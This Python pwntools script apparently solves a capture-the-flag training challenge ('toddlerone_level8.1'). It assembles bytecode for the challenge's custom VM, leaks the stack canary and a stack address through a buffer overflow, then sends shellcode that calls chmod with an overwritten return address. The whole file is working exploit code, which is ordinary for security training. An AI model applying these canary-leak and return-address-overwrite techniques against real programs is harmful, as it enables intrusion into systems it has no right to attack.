# import idc
# addr = 0x5020
# size = 0x243
# bytes_data = idc.get_bytes(addr, size)

'''
op   : op[3]
arg1 : op[1]
arg2 : op[2]
'''

def getarg(arg):
    if arg[0:2] == "0x":
        return int(arg, 16).to_bytes(1, "little")
    if arg[0] == "*":
        arg=arg[1:]
    ireg = 1
    reg="iafscdb"
    if reg.find(arg) != -1:
        ireg = ireg << reg.find(arg)
        return ireg.to_bytes(1, "little")
    elif arg == "open":
        return b"\x10"
    elif arg == "read_memory":
        return b"\x01"
    elif arg == "write":
        return b"\x20"
    return None
def assembly(ass):
    if ass == "":
        return b""
    bc = bytearray()
    ass = ass.split(" ")
    if(ass[0] == "IMM"):
        op = b"\x08"
    elif(ass[0] == "ADD"):
        op = b"\x20"
    elif(ass[0] == "STK"):
        op = b"\x02"
    elif(ass[0] == "STM"):
        op = b"\x80"
    elif(ass[0] == "LDM"):
        op = b"\x04"
    elif(ass[0] == "CMP"):
        op = b"\x40"
    elif(ass[0] == "JMP"):
        op = b"\x01"
    elif(ass[0] == "SYS"):
        op = b"\x10"
    
    for i in ass:
        c = getarg(i)
        if c != None:
            bc = bytearray(c) + bc

    bc.insert(2,op[0])
    return bc
c = bytearray()

asm = '''IMM a = 0x00
IMM b = 0xe0
IMM c = 0xef
SYS read_memory d
IMM a = 0x01
IMM b = 0xe0
IMM c = 0xef
SYS write d
IMM a = 0x00
IMM b = 0xe0
IMM c = 0xef
SYS read_memory d
IMM a = 0x01
IMM b = 0xe0
IMM c = 0xef
SYS write d
IMM a = 0x00
IMM b = 0xe0
IMM c = 0xef
SYS read_memory d
'''
asm = asm.split("\n")
for i in asm:
    c+=assembly(i)

fd = open("ttt-raw","wb+")
fd.write(c)
fd.close()

print(c)

from pwn import *
context.arch = "amd64"

my_sc = asm('''
            push 0x41
            mov rdi, rsp
            mov sil, 0x4
            mov al, 0x5a
            syscall
'''
)
# display the bytes
# print(disasm(my_sc))
p = process("/challenge/toddlerone_level8.1")
#context.terminal = ['tmux', 'splitw', '-h']
#p = gdb.debug("/challenge/toddlerone_level8.1", gdbscript='continue')
print(p.readuntil(b'yancode: '))
p.send(c)

#获取cookie
c = b"A"*0x25 + b"\x04" + b"B" * 3
p.send(c)
all = p.recv(timeout=2)
# while True:
#     all = p.recvline()
#     print(all.decode(errors="ignore"))
#     if all.find(b"BBB") != -1:  
#         break
start = all.find(b"BBB")
print(all[start + 2])
cookie = b"\x00" + all[start + 3: start + 3 + 7]
icookie = int.from_bytes(cookie, "little")
print(hex(icookie))

#获取栈中的地址
c = b"A"* 0x25 + b"\x0c" + b"AA" + b"B"*0x20
p.send(c)
all = p.recv(timeout = 2)
# while True:
#     all = p.recvline()
#     print(all.decode(errors="ignore"))
#     if all.find(b"BBBBBBB") != -1:  
#         break
start = all.find(b"BBBBBBB")
print(all[start + 0x1e])
rbp_addr = all[start + 0x20: start + 0x20+ 6]
irbp = int.from_bytes(rbp_addr, "little")
print(hex(irbp))
ret = irbp - 0x128

#exp
c = my_sc + b"\xff" *(0x28 - len(my_sc)) + cookie + b"A"*0x08 + ret.to_bytes(8, "little")
p.send(c)

all = p.recv(timeout = 1)
print(all.decode(errors="ignore"))
p.close()